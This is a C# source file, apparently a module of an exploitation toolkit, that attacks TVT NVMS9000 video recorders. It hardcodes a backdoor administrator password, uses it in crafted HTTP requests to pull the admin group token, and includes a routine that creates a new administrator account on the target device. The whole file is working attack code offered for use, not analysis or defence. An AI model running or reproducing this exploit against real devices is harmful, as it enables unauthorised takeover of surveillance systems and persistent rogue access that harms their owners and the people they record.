using System;
using System.Net;
using System.Text;

using Kaye.Net;
using Kaye.Models;

namespace Kaye.Exploits
{
    public class NVMS9000Backdoor : Exploit
    {
        private static string BackdoorPassword = "{12213BD1-69C7-4862-843D-260500D1DA40}";

        public override String GetMessage() { return "TVT NVMS9000 backdoor"; }

        public Model Model;
        public IPEndPoint Target;
        public String AdminToken;

        public static Boolean TryPerform(IPEndPoint Target, out NVMS9000Backdoor Output)
        {
            Output = new NVMS9000Backdoor();
            Output.Model = Model.NVMS9000;
            Output.Target = Target;

            try
            {
                String User = "admin";
                String Pass = BackdoorPassword;

                // Groups

                String xml = "<?xml version=\"1.0\" encoding=\"utf-8\" ?><request version=\"1.0\" systemType=\"NVMS-9000\" clientType=\"WEB\"><content><userName><![CDATA[" + User + "]]></userName><password><![CDATA[" + Base64Encode(Pass) + "]]></password></content></request>";
                String req = "POST /queryAuthGroupList HTTP/1.1\r\n" +
                             "Host: " + Target.Address.ToString() + "\r\n" +
                             "Accept-Language: bg,en-US;q=0.7,en;q=0.3\r\n" +
                             "Accept-Encoding: gzip, deflate\r\n" +
                             "Authorization: Basic " + Base64Encode(User + ":" + Pass) + "\r\n" +
                             "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n" +
                             "X-Requested-With: XMLHttpRequest\r\n" +
                             "Content-Length: " + xml.Length.ToString() + "\r\n" +
                             "Connection: keep-alive\r\n\r\n" +
                             xml;

                TCPSender Tcp = new TCPSender(Target.Address, Target.Port, req);
                if (Tcp.response == null || Tcp.response.IndexOf("errorCode") != -1) return false;

                Int32 Start = Tcp.response.IndexOf("{") + 1;
                Int32 End = Tcp.response.IndexOf("}");

                String Token = "{";
                for (Int32 i = Start; i < End; i++) Token += Tcp.response[i];
                Token += "}";

                Output.AdminToken = Token;

                return true;
            }
            catch { }

            return false;
        }
        private static string Base64Encode(String Input)
        {
            Byte[] toEncodeAsBytes = Encoding.ASCII.GetBytes(Input);
            return Convert.ToBase64String(toEncodeAsBytes);
        }
        public Boolean Register(String Username, String Password)
        {
            String xml = "<request version=\"1.0\" systemType=\"NVMS-9000\" clientType=\"WEB\"><content><userName><![CDATA[" + Username + "]]></userName><password><![CDATA[" + Password + "]]></password><email><![CDATA[]]></email><authGroupId><![CDATA[" + AdminToken + "]]></authGroupId><bindMacSwitch>false</bindMacSwitch><mac><![CDATA[00:00:00:00:00:00]]></mac><comment><![CDATA[]]></comment><enabled>true</enabled><authEffective>true</authEffective></content></request>\r\n";
            String Request = "POST /createUser HTTP/1.1\r\n" +
                         "Host: " + Target.Address.ToString() + "\r\n" +
                         "Accept-Language: bg,en-US;q=0.7,en;q=0.3\r\n" +
                         "Accept-Encoding: gzip, deflate\r\n" +
                         "Authorization: Basic " + Base64Encode("admin:" + BackdoorPassword) + "\r\n" +
                         "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n" +
                         "X-Requested-With: XMLHttpRequest\r\n" +
                         "Content-Length: " + xml.Length.ToString() + "\r\n" +
                         "Connection: keep-alive\r\n\r\n" +
                         xml;
            TCPSender Tcp = new TCPSender(Target.Address, Target.Port, Request);
            if (Tcp.response != null && Tcp.response.IndexOf("success") != -1) return true;
            return false;
        }

        public Boolean Unregister(String Username)
        {
            // TODO
            return false;
        }   
    }
}